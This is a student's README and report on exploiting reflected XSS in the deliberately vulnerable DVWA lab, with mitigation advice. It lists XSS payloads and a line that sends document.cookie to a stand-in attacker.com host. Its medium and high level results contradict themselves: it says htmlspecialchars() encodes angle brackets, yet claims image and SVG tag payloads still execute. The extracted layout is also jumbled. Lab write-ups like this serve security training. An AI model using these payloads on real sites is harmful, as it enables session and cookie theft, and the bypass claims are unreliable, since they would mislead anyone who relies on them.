








# Reflected-XSS-Assessment-DVWA

This project demonstrates a Reflected Cross-Site Scripting (XSS) attack using the Damn Vulnerable Web Application (DVWA).

## 🔍 Objective
To identify, exploit, and document reflected XSS vulnerability on DVWA.

## 📂 Files Included
- `payloads.txt`: List of XSS payloads tested
- `xss_report.md`: Documentation and PoC
- `/screenshot/`: Screenshot of successful XSS alert

## 🛡️ Mitigation
Sanitize user input using:
- HTML encoding
- JavaScript escaping
- Framework-level filters (e.g., React, Angular)

## 🧪 Tools Used
- DVWA (XAMPP setup)
- Burp Suite
- Chrome Dev Tools

## 💡 Outcome
Successfully exploited reflected XSS and documented the impact. Includes PoC image and mitigation strategy.

## 🔗 Author
Swarupa Pawbake  
📝 DVWA Reflected XSS Vulnerability Assessment
Report
📌 Vulnerability Type:
Reflected Cross-Site Scripting (XSS)
🔍 Description:
Reflected XSS occurs when user-supplied data is immediately returned by the web
application in the response, without proper sanitization. It allows attackers to execute
arbitrary JavaScript in the victim’s browser.
🧪 Test Environment:
•
•
•
•
•
Application: Damn Vulnerable Web Application (DVWA)
Module: Reflected XSS (xss_r)
Browser: Google Chrome
DVWA Security Levels: Low, Medium, High
Testing IP: 127.0.0.1:42001
🔐 Security Level: LOW
🔍 Source Code Behavior:
$name = $_GET['name'];
echo "<pre>Hello {$name}</pre>";
•
•
No sanitization
User input directly reflected into HTML🎯 Payload Used:
<script>alert(document.cookie)</script>
Result:
•
•
•
JavaScript executes
Alert box shows document.cookie
Cookie can be exfiltrated using:
<script>fetch('http://attacker.com/log?c='+document.cookie)</script>
Impact:
• Session hijacking
• Phishing attacks
• Cookie theftSecurity Level: MEDIUM
🔍 Source Code Behavior:
$name = htmlspecialchars($_GET['name']);
echo "<pre>Hello {$name}</pre>";
•
•
Uses htmlspecialchars() to encode <, >, " into HTML entities
Prevents basic scripts from executing🧪 Payloads Tried:
Payload
<script>alert(1)</script>
%3Cscript%3Ealert(1)%3C/script%3E
<img src=x onerror=alert(1)>
Result
Encoded, no
execution
Encoded
<svg/onload=alert(1)>
Success
Success
🛠️ Bypass Trick:
<img src=x onerror=alert(document.cookie)>
✅ Result:
•
•
Image-based payloads bypass encoding
Alert box pops up🧱 Security Level: HIGH
🔍 Source Code Behavior:
checkToken($_REQUEST['user_token'], $_SESSION['session_token'], 'index.php');
$name = htmlspecialchars($_GET['name']);
•
•
Validates CSRF token
Applies htmlspecialchars() on user input
⚠️ Protection Added:
•
•
•
Token-based validation
Token required in request URL (user_token)
Input still HTML-escaped
👣 Steps to Exploit:
1. Visit the vulnerable page2. Inspect element → get token:
<input type="hidden" name="user_token" value="abcd1234">
3. Construct payload URL http://127.0.0.1:42001/vulnerabilities/xss_r/?name=<img
src=x onerror=alert(1)>&user_token=abcd1234Result:If token is valid and image-based payload is used → JavaScript runs
Impact Summary
Level
Bypass Needed
Payload Example
Can Steal
CookieLowNone<script>Yes
MediumEncoding Bypass<img onerror>Yes
Token + Encoding
Bypass<img> + tokenYes
High
🛡️ Recommendations:
1. Context-aware encoding
a. Use htmlspecialchars() for HTML context
b. Use proper encoding for attributes, JavaScript, and URLs
2. Input validation
a. Only allow safe input characters (a-zA-Z0-9)
3. Content Security Policy (CSP)
a. Use script-src 'self' to prevent inline script execution
4. HttpOnly Cookies
a. Prevents document.cookie access from JavaScript
5. Sanitize Output
a. Use security libraries like OWASP ESAPI or built-in framework features
📂 Mitigation Code Sample:
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "<pre>Hello {$name}</pre>";
Add HTTP Headers:
Content-Security-Policy: script-src 'self';
X-Content-Type-Options: nosniff📦 Report Summary Table
Parameter
Vulnerability
Affected Pages
Impact
Risk Level
Tested Levels
Tools Used
Status
Value
Reflected Cross-Site Scripting (XSS)
vulnerabilities/xss_r
JavaScript Execution, Cookie Theft
High
Low, Medium, High
Browser, DVWA
Confirmed 
